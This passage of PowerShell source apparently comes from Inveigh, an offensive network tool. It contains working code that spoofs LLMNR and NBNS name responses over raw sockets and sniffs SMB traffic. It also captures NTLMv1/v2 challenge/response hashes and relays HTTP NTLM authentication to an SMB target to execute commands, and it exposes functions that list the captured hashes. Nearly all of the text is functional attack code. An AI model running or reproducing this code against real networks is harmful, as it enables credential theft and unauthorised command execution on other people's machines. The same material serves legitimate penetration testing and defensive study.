                                if((!$SMB_relay_failed) -and ([System.BitConverter]::ToString($SMB_relay_response_return_bytes[9..12]) -eq ('00-00-00-00')))
                                {
                                    $inveigh.console_queue.add("$HTTP_type to SMB relay authentication successful for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string on $SMBRelayTarget")
                                    $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - $HTTP_type to SMB relay authentication successful for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string on $SMBRelayTarget")])
                                    $inveigh.SMB_relay_active_step = 4
                                    SMBRelayExecute $SMB_relay_socket $SMB_user_ID          
                                }
                                else
                                {
                                    $inveigh.console_queue.add("$HTTP_type to SMB relay authentication failed for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string on $SMBRelayTarget")
                                    $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - $HTTP_type to SMB relay authentication failed for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string on $SMBRelayTarget")])
                                    $inveigh.SMBRelay_failed_list += "$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string $SMBRelayTarget"
                                    $inveigh.SMB_relay_active_step = 0
                                    $SMB_relay_socket.Close()
                                }
                            }
                            else
                            {
                                $inveigh.console_queue.add("NTLMv1 relay not yet supported")
                                $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - NTLMv1 relay not yet supported")])
                                $inveigh.SMB_relay_active_step = 0
                                $SMB_relay_socket.Close()
                            }
                        }
                        else
                        {
                            $inveigh.console_queue.add("Aborting relay since $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string has already been tried on $SMBRelayTarget")
                            $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - Aborting relay since $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string has already been tried on $SMBRelayTarget")])
                            $inveigh.SMB_relay_active_step = 0
                            $SMB_relay_socket.Close()
                        }
                    }
                    else
                    {
                        $inveigh.console_queue.add("$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string not on relay username list")
                        $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string not on relay username list")])
                        $inveigh.SMB_relay_active_step = 0
                        $SMB_relay_socket.Close()
                    }
                }
            }
            else
            {
                $NTLM = 'NTLM'
            }
        
        }
        
        [byte[]] $HTTP_buffer = [System.Text.Encoding]::UTF8.GetBytes($inveigh.message)
        $inveigh.response.ContentLength64 = $HTTP_buffer.length
        $inveigh.response.AddHeader("WWW-Authenticate",$NTLM)
        $HTTP_stream = $inveigh.response.OutputStream
        $HTTP_stream.write($HTTP_buffer, 0, $HTTP_buffer.length)
        $HTTP_stream.close()
    }
    $inveigh.HTTP_listener.stop()
    $inveigh.HTTP_listener.close()
}

# Sniffer/Spoofer ScriptBlock - LLMNR/NBNS Spoofer and SMB sniffer
$sniffer_scriptblock = 
{

    param ($LLMNR_response_message,$NBNS_response_message,$IP,$SpooferIP,$SMB,$LLMNR,$NBNS,$NBNSTypes,$Repeat,$ForceWPADAuth,$RunTime)

    $byte_in = New-Object Byte[] 4	
    $byte_out = New-Object Byte[] 4	
    $byte_data = New-Object Byte[] 4096
    $byte_in[0] = 1  					
    $byte_in[1-3] = 0
    $byte_out[0] = 1
    $byte_out[1-3] = 0
    $inveigh.sniffer_socket = New-Object System.Net.Sockets.Socket([Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Raw,[Net.Sockets.ProtocolType]::IP)
    $inveigh.sniffer_socket.SetSocketOption("IP","HeaderIncluded",$true)
    $inveigh.sniffer_socket.ReceiveBufferSize = 1024
    $end_point = New-Object System.Net.IPEndpoint([Net.IPAddress]"$IP", 0)
    $inveigh.sniffer_socket.Bind($end_point)
    [void]$inveigh.sniffer_socket.IOControl([Net.Sockets.IOControlCode]::ReceiveAll,$byte_in,$byte_out)

    if($RunTime)
    {    
        $main_timeout = new-timespan -Minutes $RunTime
        $main_stopwatch = [diagnostics.stopwatch]::StartNew()
    }

    while($inveigh.running)
    {
        try
        {
            $packet_data = $inveigh.sniffer_socket.Receive($byte_data,0,$byte_data.length,[Net.Sockets.SocketFlags]::None)
        }
        catch
        {}
    
        $memory_stream = New-Object System.IO.MemoryStream($byte_data,0,$packet_data)
        $binary_reader = New-Object System.IO.BinaryReader($memory_stream)
    
        # IP header fields
        $version_HL = $binary_reader.ReadByte()
        $type_of_service= $binary_reader.ReadByte()
        $total_length = DataToUInt16 $binary_reader.ReadBytes(2)
        $identification = $binary_reader.ReadBytes(2)
        $flags_offset = $binary_reader.ReadBytes(2)
        $TTL = $binary_reader.ReadByte()
        $protocol_number = $binary_reader.ReadByte()
        $header_checksum = [Net.IPAddress]::NetworkToHostOrder($binary_reader.ReadInt16())
        $source_IP_bytes = $binary_reader.ReadBytes(4)
        $source_IP = [System.Net.IPAddress]$source_IP_bytes
        $destination_IP_bytes = $binary_reader.ReadBytes(4)
        $destination_IP = [System.Net.IPAddress]$destination_IP_bytes
        $IP_version = [int]"0x$(('{0:X}' -f $version_HL)[0])"
        $header_length = [int]"0x$(('{0:X}' -f $version_HL)[1])" * 4
        
        switch($protocol_number)
        {
            6 {  # TCP
                $source_port = DataToUInt16 $binary_reader.ReadBytes(2)
                $destination_port = DataToUInt16 $binary_reader.ReadBytes(2)
                $sequence_number = DataToUInt32 $binary_reader.ReadBytes(4)
                $ack_number = DataToUInt32 $binary_reader.ReadBytes(4)
                $TCP_header_length = [int]"0x$(('{0:X}' -f $binary_reader.ReadByte())[0])" * 4
                $TCP_flags = $binary_reader.ReadByte()
                $TCP_window = DataToUInt16 $binary_reader.ReadBytes(2)
                $TCP_checksum = [System.Net.IPAddress]::NetworkToHostOrder($binary_reader.ReadInt16())
                $TCP_urgent_pointer = DataToUInt16 $binary_reader.ReadBytes(2)    
                $payload_bytes = $binary_reader.ReadBytes($total_length - ($header_length + $TCP_header_length))
            }       
            17 {  # UDP
                $source_port =  $binary_reader.ReadBytes(2)
                $source_port_2 = DataToUInt16 ($source_port)
                $destination_port = DataToUInt16 $binary_reader.ReadBytes(2)
                $UDP_length = $binary_reader.ReadBytes(2)
                $UDP_length_2  = DataToUInt16 ($UDP_length)
                [void]$binary_reader.ReadBytes(2)
                $payload_bytes = $binary_reader.ReadBytes(($UDP_length_2 - 2) * 4)
            }
        }
        
        # Incoming packets 
        switch ($destination_port)
        {
            137 { # NBNS
                if($payload_bytes[5] -eq 1)
                {
                    try
                    {
                        $UDP_length[0] += 16
                        
                        [Byte[]] $NBNS_response_data = $payload_bytes[13..$payload_bytes.length]`
                            + (0x00,0x00,0x00,0xa5,0x00,0x06,0x00,0x00)`
                            + ([IPAddress][String]([IPAddress]$SpooferIP)).GetAddressBytes()`
                            + (0x00,0x00,0x00,0x00)
                
                        [Byte[]] $NBNS_response_packet = (0x00,0x89)`
                            + $source_port[1,0]`
                            + $UDP_length[1,0]`
                            + (0x00,0x00)`
                            + $payload_bytes[0,1]`
                            + (0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20)`
                            + $NBNS_response_data
                
                        $send_socket = New-Object Net.Sockets.Socket( [Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Raw,[Net.Sockets.ProtocolType]::Udp )
                        $send_socket.SendBufferSize = 1024
                        $destination_point = New-Object Net.IPEndpoint( $source_IP, $source_port_2 )
                    
                        $NBNS_query_type = [System.BitConverter]::ToString($payload_bytes[43..44])
                    
                        switch ($NBNS_query_type)
                        {
                            '41-41' {
                                $NBNS_query_type = '00'
                            }
                            '41-44' {
                                $NBNS_query_type = '03'
                            }
                            '43-41' {
                                $NBNS_query_type = '20'
                            }
                            '42-4C' {
                                $NBNS_query_type = '1B'
                            }
                            '42-4D' {
                            $NBNS_query_type = '1C'
                            }
                            '42-4E' {
                            $NBNS_query_type = '1D'
                            }
                            '42-4F' {
                            $NBNS_query_type = '1E'
                            }
                        }
      
                        if($NBNS -eq 'y')
                        {
                            if ($NBNSTypes -contains $NBNS_query_type)
                            { 
                                if ($inveigh.IP_capture_list -notcontains $source_IP)
                                {
                                    [void]$send_socket.sendTo( $NBNS_response_packet, $destination_point )
                                    $send_socket.Close( )
                                    $NBNS_response_message = "- spoofed response has been sent"
                                }
                                else
                                {
                                    $NBNS_response_message = "- spoof suppressed due to previous capture"
                                }
                            }
                            else
                            {
                                $NBNS_response_message = "- spoof not sent due to disabled type"
                            }
                        }
                
                        $NBNS_query = [System.BitConverter]::ToString($payload_bytes[13..$payload_bytes.length])
                        $NBNS_query = $NBNS_query -replace "-00",""
                        $NBNS_query = $NBNS_query.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
                        $NBNS_query_string_encoded = New-Object System.String ($NBNS_query,0,$NBNS_query.Length)
                        $NBNS_query_string_encoded = $NBNS_query_string_encoded.Substring(0,$NBNS_query_string_encoded.IndexOf("CA"))
                        
                        $NBNS_query_string_subtracted = ""
                        $NBNS_query_string = ""
                        
                        $n = 0
                        
                        do
                        {
                            $NBNS_query_string_sub = (([byte][char]($NBNS_query_string_encoded.Substring($n,1)))-65)
                            $NBNS_query_string_subtracted += ([convert]::ToString($NBNS_query_string_sub,16))
                            $n += 1
                        }
                        until($n -gt ($NBNS_query_string_encoded.Length - 1))
                    
                        $n = 0
                    
                        do
                        {
                            $NBNS_query_string += ([char]([convert]::toint16($NBNS_query_string_subtracted.Substring($n,2),16)))
                            $n += 2
                        }
                        until($n -gt ($NBNS_query_string_subtracted.Length - 1))

                        $inveigh.console_queue.add("$(Get-Date -format 's') - NBNS request for $NBNS_query_string<$NBNS_query_type> received from $source_IP $NBNS_response_message")
                        $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - NBNS request for $NBNS_query_string<$NBNS_query_type> received from $source_IP $NBNS_response_message")])
                    
                    }
                    catch{}
                }
            }
            139
            {
                if($SMB -eq 'y')
                {
                    SMBNTLMResponse $payload_bytes
                }
            }
            445 { # SMB
                if($SMB -eq 'y')
                {
                    SMBNTLMResponse $payload_bytes
                }
            }
            5355 { # LLMNR
                $UDP_length[0] += $payload_bytes.length - 2
                
                [Byte[]] $LLMNR_response_data = $payload_bytes[12..$payload_bytes.length]
                    $LLMNR_response_data += $LLMNR_response_data`
                    + (0x00,0x00,0x00,0x1e,0x00,0x04)`
                    + ([IPAddress][String]([IPAddress]$SpooferIP)).GetAddressBytes()
            
                [Byte[]] $LLMNR_response_packet = (0x14,0xeb)`
                    + $source_port[1,0]`
                    + $UDP_length[1,0]`
                    + (0x00,0x00)`
                    + $payload_bytes[0,1]`
                    + (0x80,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00)`
                    + $LLMNR_response_data
            
                $send_socket = New-Object Net.Sockets.Socket( [Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Raw,[Net.Sockets.ProtocolType]::Udp )
                $send_socket.SendBufferSize = 1024
                $destination_point = New-Object Net.IPEndpoint( $source_IP, $source_port_2 )
     
                if($LLMNR -eq 'y')
                {
                    if ($inveigh.IP_capture_list -notcontains $source_IP)
                    {
                        [void]$send_socket.sendTo( $LLMNR_response_packet, $destination_point )
                        $send_socket.Close( )
                        $LLMNR_response_message = "- spoofed response has been sent"
                    }
                    else
                    {
                        $LLMNR_response_message = "- spoof suppressed due to previous capture"
                    }
                }
                
                $LLMNR_query = [System.BitConverter]::ToString($payload_bytes[13..($payload_bytes.length - 4)])
                $LLMNR_query = $LLMNR_query -replace "-00",""
                $LLMNR_query = $LLMNR_query.Split("-") | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
                $LLMNR_query_string = New-Object System.String ($LLMNR_query,0,$LLMNR_query.Length)
             
                $inveigh.console_queue.add("$(Get-Date -format 's') - LLMNR request for $LLMNR_query_string received from $source_IP $LLMNR_response_message")
                $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - LLMNR request for $LLMNR_query_string received from $source_IP $LLMNR_response_message")])
            }
        }
        
        # Outgoing packets
        switch ($source_port)
        {
            139 {
                if($SMB -eq 'y')
                {   
                    $NTLM_challenge = SMBNTLMChallenge $payload_bytes
                }
            }
            445 { # SMB
                if($SMB -eq 'y')
                {   
                    $NTLM_challenge = SMBNTLMChallenge $payload_bytes
                }
            }
        }

        if($RunTime)
        {    
            if($main_stopwatch.elapsed -ge $main_timeout)
            {

                $inveigh.running = $false
            
                if($inveigh.HTTP_listener.IsListening)
                {
                    $inveigh.HTTP_listener.Stop()
                    $inveigh.HTTP_listener.Close()
                }

                if($inveigh.status_output)
                {
                    $inveigh.host.ui.WriteWarningLine("Inveigh auto-exited at $(Get-Date -format 's')")
                }

                $inveigh.log.add("$(Get-Date -format 's') - Inveigh auto-exited")

                if($inveigh.file_output)
                {
                    "$(Get-Date -format 's') - Inveigh auto-exited"| Out-File $Inveigh.log_out_file -Append
                } 
    
                if($inveigh.HTTPS)
                {
                    Invoke-Expression -command "netsh http delete sslcert ipport=0.0.0.0:443" > $null
        
                    try
                    {
                        $certificate_store = New-Object System.Security.Cryptography.X509Certificates.X509Store("My","LocalMachine")
                        $certificate_store.Open('ReadWrite')
                        $certificate = $certificate_store.certificates.find("FindByThumbprint",$inveigh.certificate_thumbprint,$FALSE)[0]
                        $certificate_store.Remove($certificate)
                        $certificate_store.Close()
                    }
                    catch
                    {
                        if($inveigh.status_output)
                        {
                            $inveigh.host.ui.WriteWarningLine("SSL Certificate Deletion Error - Remove Manually")
                            $inveigh.log.add("$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually")
                        }

                        if($inveigh.file_output)
                        {
                            "$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually"| Out-File $Inveigh.log_out_file -Append   
                        }
                    }
                }
            }
        }
        
        while(($inveigh.console_queue.Count -gt 0) -and ($inveigh.console_output))
        {
            switch -wildcard ($inveigh.console_queue[0])
            {
                "*local administrator*"
                {
                    $inveigh.host.ui.WriteWarningLine($inveigh.console_queue[0])
                    $inveigh.console_queue.RemoveRange(0,1)
                }
                "*NTLMv1 challenge/response written*"
                {
                    if($inveigh.file_output)
                    {
                        $inveigh.host.ui.WritewarningLine($inveigh.console_queue[0])
                    }
                    $inveigh.console_queue.RemoveRange(0,1)
                }
                "*NTLMv2 challenge/response written*"
                {
                    if($inveigh.file_output)
                    {
                        $inveigh.host.ui.WritewarningLine($inveigh.console_queue[0])
                    }
                    $inveigh.console_queue.RemoveRange(0,1)
                }
                "* relay *"
                {
                    $inveigh.host.ui.WriteWarningLine($inveigh.console_queue[0])
                    $inveigh.console_queue.RemoveRange(0,1)
                }
                "Service *"
                {
                    $inveigh.host.ui.WriteWarningLine($inveigh.console_queue[0])
                    $inveigh.console_queue.RemoveRange(0,1)
                }
                default
                {
                    $inveigh.host.ui.WriteLine($inveigh.console_queue[0])
                    $inveigh.console_queue.RemoveRange(0,1)
                }
            }    
        }

        if($inveigh.file_output)
        {
            while($inveigh.log_file_queue.Count -gt 0)
            {
                $inveigh.log_file_queue[0]|Out-File $inveigh.log_out_file -Append
                $inveigh.log_file_queue.RemoveRange(0,1)
            }

            while($inveigh.NTLMv1_file_queue.Count -gt 0)
            {
                $inveigh.NTLMv1_file_queue[0]|Out-File $inveigh.NTLMv1_out_file -Append
                $inveigh.NTLMv1_file_queue.RemoveRange(0,1)
            }

            while($inveigh.NTLMv2_file_queue.Count -gt 0)
            {
                $inveigh.NTLMv2_file_queue[0]|Out-File $inveigh.NTLMv2_out_file -Append
                $inveigh.NTLMv2_file_queue.RemoveRange(0,1)
            }
        }

    }
}

# End ScriptBlocks
# Begin Startup Functions

# HTTP/HTTPS Listener Startup Function 
Function HTTPListener()
{
    $inveigh.HTTP_listener = New-Object System.Net.HttpListener

    if($inveigh.HTTP)
    {
        $inveigh.HTTP_listener.Prefixes.Add('http://*:80/')
    }

    if($inveigh.HTTPS)
    {
        $inveigh.HTTP_listener.Prefixes.Add('https://*:443/')
    }

    $inveigh.HTTP_listener.AuthenticationSchemes = "Anonymous" 
    $inveigh.HTTP_listener.Start()
    $HTTP_runspace = [runspacefactory]::CreateRunspace()
    $HTTP_runspace.Open()
    $HTTP_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)
    $HTTP_powershell = [powershell]::Create()
    $HTTP_powershell.Runspace = $HTTP_runspace
    $HTTP_powershell.AddScript($shared_basic_functions_scriptblock) > $null
    $HTTP_powershell.AddScript($SMB_relay_challenge_scriptblock) > $null
    $HTTP_powershell.AddScript($SMB_relay_response_scriptblock) > $null
    $HTTP_powershell.AddScript($SMB_relay_execute_scriptblock) > $null
    $HTTP_powershell.AddScript($SMB_NTLM_functions_scriptblock) > $null
    $HTTP_powershell.AddScript($HTTP_scriptblock).AddArgument($Challenge).AddArgument(
        $SMBRelay).AddArgument($SMBRelayTarget).AddArgument($SMBRelayCommand).AddArgument($SMBRelayUsernames).AddArgument(
        $SMBRelayAutoDisable).AddArgument($SMBRelayNetworkTimeout).AddArgument($Repeat).AddArgument($ForceWPADAuth) > $null
    $HTTP_handle = $HTTP_powershell.BeginInvoke()
}

# Sniffer/Spoofer Startup Function
Function SnifferSpoofer()
{
    $sniffer_runspace = [runspacefactory]::CreateRunspace()
    $sniffer_runspace.Open()
    $sniffer_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)
    $sniffer_powershell = [powershell]::Create()
    $sniffer_powershell.Runspace = $sniffer_runspace
    $sniffer_powershell.AddScript($shared_basic_functions_scriptblock) > $null
    $sniffer_powershell.AddScript($SMB_NTLM_functions_scriptblock) > $null
    $sniffer_powershell.AddScript($sniffer_scriptblock).AddArgument($LLMNR_response_message).AddArgument(
        $NBNS_response_message).AddArgument($IP).AddArgument($SpooferIP).AddArgument($SMB).AddArgument(
        $LLMNR).AddArgument($NBNS).AddArgument($NBNSTypes).AddArgument($Repeat).AddArgument(
        $ForceWPADAuth).AddArgument($RunTime) > $null
    $sniffer_handle = $sniffer_powershell.BeginInvoke()
}

# End Startup Functions

# Startup Enabled Services

# HTTP Server Start
if(($inveigh.HTTP) -or ($inveigh.HTTPS))
{
    HTTPListener
}

# Sniffer/Spoofer Start - always enabled
SnifferSpoofer
}
#End Invoke-Inveigh

Function Stop-Inveigh
{
    <#
    .SYNOPSIS
    Stop-Inveigh will stop Inveigh.
    #>
    if($inveigh)
    {
        if($inveigh.running)
        {
            $inveigh.running = $false
            
            if($inveigh.HTTP_listener.IsListening)
            {
                $inveigh.HTTP_listener.Stop()
                $inveigh.HTTP_listener.Close()
            }

            Write-Warning "Inveigh exited at $(Get-Date -format 's')"
            $inveigh.log.add("$(Get-Date -format 's') - Inveigh exited")|out-null

            if($inveigh.file_output)
            {
                "$(Get-Date -format 's') - Inveigh exited"| Out-File $Inveigh.log_out_file -Append
            } 
        }
        else
        {
            Write-Warning "Inveigh isn't running"
        }
    
        if($inveigh.HTTPS)
        {
            Invoke-Expression -command "netsh http delete sslcert ipport=0.0.0.0:443" > $null
        
            try
            {
                $certificate_store = New-Object System.Security.Cryptography.X509Certificates.X509Store("My","LocalMachine")
                $certificate_store.Open('ReadWrite')
                $certificate = $certificate_store.certificates.find("FindByThumbprint",$inveigh.certificate_thumbprint,$FALSE)[0]
                $certificate_store.Remove($certificate)
                $certificate_store.Close()
            }
            catch
            {
                Write-Warning "SSL Certificate Deletion Error - Remove Manually"
                $inveigh.log.add("$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually")|out-null

                if($inveigh.file_output)
                {
                    "$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually"| Out-File $Inveigh.log_out_file -Append   
                }
            }
        }
    }
    else
    {
        Write-Warning "Inveigh isn't running"
    }
} 

Function Get-Inveigh
{
    <#
    .SYNOPSIS
    Get-Inveigh will display queued Inveigh output.
    #>
    while($inveigh.console_queue.Count -gt 0)
    {
        switch -wildcard ($inveigh.console_queue[0])
        {
            "*local administrator*"
            {
                write-warning $inveigh.console_queue[0]
                $inveigh.console_queue.RemoveRange(0,1)
            }
            "*NTLMv1 challenge/response written*"
            {
            if($inveigh.file_output)
            {
                write-warning $inveigh.console_queue[0]
            }
                $inveigh.console_queue.RemoveRange(0,1)
            }
            "*NTLMv2 challenge/response written*"
            {
            if($inveigh.file_output)
            {
                write-warning $inveigh.console_queue[0]
            }
                $inveigh.console_queue.RemoveRange(0,1)
            }
            "* relay *"
            {
                write-warning $inveigh.console_queue[0]
                $inveigh.console_queue.RemoveRange(0,1)
            }
            "Service *"
            {
                write-warning $inveigh.console_queue[0]
                $inveigh.console_queue.RemoveRange(0,1)
            }
            default
            {
                write-output $inveigh.console_queue[0]
                $inveigh.console_queue.RemoveRange(0,1)
            }
        }    
    }
}

Function Get-InveighNTLM
{
    <#
    .SYNOPSIS
    Get-InveighNTLM will get all captured challenge/response hashes.
    #>
    $inveigh.NTLMv1_list
    $inveigh.NTLMv2_list
}

Function Get-InveighNTLMv1
{
    <#
    .SYNOPSIS
    Get-InveighNTLMv1 will get captured NTLMv1 challenge/response hashes.
    #>
    $inveigh.NTLMv1_list
}

Function Get-InveighNTLMv2
{
    <#
    .SYNOPSIS
    Get-InveighNTLMv2 will get captured NTLMv1 challenge/response hashes.
    #>
    $inveigh.NTLMv2_list
}

Function Get-InveighLog
{
    <#
    .SYNOPSIS
    Get-InveighLog will get log.
    #>
    $inveigh.log
}

Function Get-InveighStats
{
    <#
    .SYNOPSIS
    Get-InveighLog will get log.
    #>
    Write-Output("Total NTLMv1 Captures = " + $inveigh.NTLMv1_list.count)
    Write-Output("Total NTLMv2 Captures = " + $inveigh.NTLMv2_list.count)
}

Function Watch-Inveigh
{
    <#
    .SYNOPSIS
    Watch-Inveigh will enabled real time console output.
    #>
    if($inveigh)
    {
        $inveigh.console_output = $true
    }
}

Function Hide-Inveigh
{
    <#
    .SYNOPSIS
    Hide-Inveigh will disable real time console output.
    #>
    if($inveigh)
    {
        $inveigh.console_output = $false
    }
}

Function Clear-Inveigh
{
    <#
    .SYNOPSIS
    Clear-Inveigh will clear Inveigh's NTLMv1, NTLMv2, log, output, failed smbrelay, and spoof repeat suppression lists.
    #>
    if($inveigh)
    {
        $inveigh.console_queue = New-Object System.Collections.ArrayList
        $inveigh.log_list = New-Object System.Collections.ArrayList
        $inveigh.NTLMv1_list = New-Object System.Collections.ArrayList
        $inveigh.NTLMv2_list = New-Object System.Collections.ArrayList
        $inveigh.log_file_queue = New-Object System.Collections.ArrayList
        $inveigh.NTLMv1_file_queue = New-Object System.Collections.ArrayList
        $inveigh.NTLMv2_file_queue = New-Object System.Collections.ArrayList
    }
}

Function Get-InveighHelp
{
    "-"*26 + "(Get-InveighHelp)" + "-"*26 | Write-Output
    write-output "Invoke-Inveigh - Start Inveigh with or without parameters"
    write-output "Get-Inveigh - Get queued console output"
    write-output "Get-InveighLog - Get log entries"
    write-output "Get-InveighNTLM - Get all captured challenge/response hashes" 
    write-output "Get-InveighNTLMv1 - Get captured NTLMv1 challenge/response hashes"
    write-output "Get-InveighNTLMv2 - Get captured NTLMv2 challenge/response hashes"
    write-output "Get-InveighStats - Get captured challenge/response counts"
    write-output "Watch-Inveigh - Enable real time console output"
    write-output "Hide-Inveigh - Disable real time console output"
    write-output "Clear-Inveigh - Clear capture, log, smbrelay, and spoof lists"
    write-output "Stop-Inveigh - Stop Inveigh"
    "-"*69 | Write-Output
}